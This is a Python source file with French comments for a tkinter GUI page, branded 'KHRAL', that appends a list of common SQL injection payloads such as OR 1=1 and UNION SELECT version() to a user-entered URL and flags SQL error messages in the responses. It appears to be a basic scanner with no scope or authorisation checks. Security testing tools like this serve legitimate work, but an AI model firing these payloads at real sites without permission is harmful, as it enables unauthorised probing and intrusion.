import tkinter as tk
import requests
import urllib.parse

import tkinter as tk
import requests

def test_sql_injection(url, results_text):
    """
    Test d'une injection SQL en envoyant une série de charges utiles malveillantes à l'URL fournie.
    """
    # Liste des payloads courants utilisés pour tester les injections SQL.
    payloads = [
        ("' OR '1'='1'--", "Test avec injection OR '1'='1'--"),
        ("' OR 1=1--", "Test avec injection OR 1=1--"),
        ("' OR 1=1#", "Test avec injection OR 1=1#"),
        ("' OR 1=1/*", "Test avec injection OR 1=1/*"),
        ("' AND 1=1--", "Test avec injection AND 1=1--"),
        ("' AND 1=2--", "Test avec injection AND 1=2--"),
        ("1' UNION SELECT NULL, NULL--", "Test avec injection UNION SELECT NULL, NULL--"),
        ("1' UNION SELECT NULL, version()--", "Test avec injection UNION SELECT NULL, version()--")
    ]

    # Drapeau indiquant si le site est vulnérable ou non.
    successful_tests = []  # Liste pour stocker les tests réussis

    # Efface le contenu précédent affiché dans le widget Text.
    results_text.delete("1.0", tk.END)

    # Boucle sur chaque payload pour tester les vulnérabilités.
    for payload, description in payloads:
        # Affiche le message indiquant quel test est en cours
        results_text.insert(tk.END, f"{description}...\n")
        test_url = f"{url}{payload}"
        
        try:
            # Envoie une requête HTTP GET à l'URL construite
            response = requests.get(test_url)

            # Vérifie si la réponse contient des messages d'erreur typiques liés à une injection SQL.
            if any(err in response.text.lower() for err in ["sql syntax", "mysql", "syntax error"]):
                # Si un message d'erreur SQL est détecté, cela signifie que le site est vulnérable
                successful_tests.append(description)  # Ajoute le test à la liste des tests réussis
        except Exception as e:
            # Capture et affiche toute erreur rencontrée lors de la requête HTTP.
            results_text.insert(tk.END, f"Erreur lors de la requête : {e}\n")
            return

    # Résumé des tests
    if not successful_tests:
        results_text.insert(tk.END, "Aucune vulnérabilité détectée.\n")
    else:
        results_text.insert(tk.END, f"{len(successful_tests)} injection(s) réussie(s) :\n")
        for test in successful_tests:
            results_text.insert(tk.END, f"- {test}\n")


def get_ip():
    try:
        response = requests.get("https://api.ipify.org")
        ip = response.text
        return ip
    except requests.exceptions.RequestException:
        return "IP non disponible"


def show_sql_page(back_to_menu):
    """Show the SQL Injection page."""
    sql_window = tk.Tk()
    sql_window.title("KHRAL - Injection SQL")
    
    # Définir la taille de la fenêtre
    window_width = 1000
    window_height = 700
    
    # Récupérer les dimensions de l'écran
    screen_width = sql_window.winfo_screenwidth()
    screen_height = sql_window.winfo_screenheight()

    # Calculer les coordonnées pour centrer la fenêtre
    x_position = (screen_width // 2) - (window_width // 2)
    y_position = (screen_height // 2) - (window_height // 2)

    # Positionner la fenêtre au centre de l'écran
    sql_window.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    
    sql_window.config(bg="#2e2e2e")  # Fond sombre pour un look moderne

    # Configurer une seule colonne pour tout centrer
    sql_window.grid_columnconfigure(0, weight=1)

    # Titre au centre
    title_label = tk.Label(sql_window, text="KHRAL", font=("Helvetica", 32, "bold"), fg="white", bg="#2e2e2e")
    title_label.grid(row=0, column=0, pady=20, sticky="n")

    # Zone d'entrée pour l'URL
    url_label = tk.Label(sql_window, text="Entrez l'URL à tester :", font=("Helvetica", 14), fg="white", bg="#2e2e2e")
    url_label.grid(row=1, column=0, pady=10, sticky="n")

    url_entry = tk.Entry(sql_window, font=("Helvetica", 14), width=40)
    url_entry.grid(row=2, column=0, pady=10, sticky="n")

    # Zone de texte pour afficher les résultats
    results_text = tk.Text(sql_window, height=15, width=70, font=("Helvetica", 14))
    results_text.grid(row=3, column=0, pady=10, sticky="n")

    # Bouton pour tester l'injection SQL
    test_button = tk.Button(sql_window, text="Tester l'injection SQL", font=("Helvetica", 14), bg="#4CAF50", fg="white",
                            command=lambda: test_sql_injection(url_entry.get(), results_text))
    test_button.grid(row=4, column=0, pady=10, sticky="n")

    # Bouton pour revenir au menu principal
    back_button = tk.Button(sql_window, text="Retour", font=("Helvetica", 14), command=lambda: [sql_window.destroy(), back_to_menu()])
    back_button.grid(row=5, column=0, pady=10, sticky="n")

    sql_window.mainloop()
